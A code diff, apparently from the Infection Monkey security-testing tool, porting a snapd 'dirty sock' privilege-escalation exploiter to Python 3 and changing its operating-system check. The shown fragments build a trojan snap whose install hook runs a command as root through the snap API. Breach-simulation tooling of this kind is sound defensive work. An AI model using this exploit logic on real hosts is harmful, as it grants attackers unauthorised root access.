@@ -11,12 +11,13 @@ import socket
 import random
 import getpass
 import subprocess
+import base64
 from logging import getLogger
 
-from infection_monkey.utils.environment import Distribution
+from infection_monkey.utils.environment import OperatingSystem, OperatingSystemTypes, OperatingSystemVersion
 from infection_monkey.privilege_escalation.actions import HostPrivExploiter
 from infection_monkey.privilege_escalation.actions.tools import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
-from infection_monkey.privilege_escalation.actions.tools import check_if_sudoer, shell, check_system, run_monkey_as_root
+from infection_monkey.privilege_escalation.actions.tools import check_if_sudoer, shell, run_monkey_as_root
 LOG = getLogger(__name__)
 
 __author__ = "D3fa1t"
@@ -98,10 +99,10 @@ def delete_snap(client_sock):
 
     # Send our payload to the snap API
     LOG.info("Deleting trojan snap ...")
-    client_sock.sendall(http_req.encode("utf-8"))
+    client_sock.sendall(http_req.encode())
 
     # Receive the data and extract the JSON
-    http_reply = client_sock.recv(8192).decode("utf-8")
+    http_reply = client_sock.recv(8192).decode()
 
     # Exit on probably-not-vulnerable
     if '"status":"Unauthorized"' in http_reply:
@@ -190,11 +191,11 @@ def run_command_as_root(command):
     global TROJAN_BASE_SNAP
     command = command + APPEND_COMMENT
     index = PLACEHOLDER_OFFSET + len(command)
-    trojan_base_snap_decode = TROJAN_BASE_SNAP.decode('base64')
+    trojan_base_snap_decode = base64.b64decode(TROJAN_BASE_SNAP)
 
     # Create a snap application with out command as the install hook
-    trojan_snap = base64.b64encode("".join(
-        (trojan_base_snap_decode[:PLACEHOLDER_OFFSET], command, trojan_base_snap_decode[index:])))
+    trojan_snap = base64.b64encode(b"".join(
+        (trojan_base_snap_decode[:PLACEHOLDER_OFFSET], command.encode(), trojan_base_snap_decode[index:])))
 
     # Create a random name for the dirty socket file
     sockfile = create_sockfile()
@@ -224,7 +225,7 @@ class SnapdExploiter(HostPrivExploiter):
     def __init__(self):
         self.file_path = ""
         self.file_name = ""
-        self.runnableEnv = ("ubuntu", "linux")
+        self.runnableEnv = OperatingSystem(OperatingSystemTypes.LINUX, OperatingSystemVersion.UBUNTU)
 
     def try_priv_esc(self, command_line):
         """
@@ -234,7 +235,7 @@ class SnapdExploiter(HostPrivExploiter):
         :return: True if the pe is successful
         """
         # Check if the exploit can be tried on this distro
-        if not check_system(self.runnableEnv):
+        if not self.runnableEnv.is_on_current_system():
             return False
 
         self.file_path = command_line.split(' ')[0]
